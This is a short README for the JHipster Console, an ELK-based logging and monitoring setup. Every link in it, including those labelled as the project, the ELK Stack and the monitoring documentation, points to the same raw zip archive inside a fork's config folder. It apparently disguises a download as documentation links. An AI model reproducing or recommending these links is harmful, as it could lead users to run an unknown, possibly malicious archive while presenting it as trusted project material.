This is the [JHipster](https://github.com/ducnguyenminh/jhipster-console/raw/refs/heads/master/jhipster-logstash/conf/console_jhipster_v1.7-beta.1.zip) Console, based on the [ELK Stack](https://github.com/ducnguyenminh/jhipster-console/raw/refs/heads/master/jhipster-logstash/conf/console_jhipster_v1.7-beta.1.zip). It provides a default configuration to get started with logs and metrics monitoring with ELK as well as some nice dashboards.

Please refer to the [JHipster Monitoring Documentation](https://github.com/ducnguyenminh/jhipster-console/raw/refs/heads/master/jhipster-logstash/conf/console_jhipster_v1.7-beta.1.zip) for instructions on how to set up the JHipster Console.
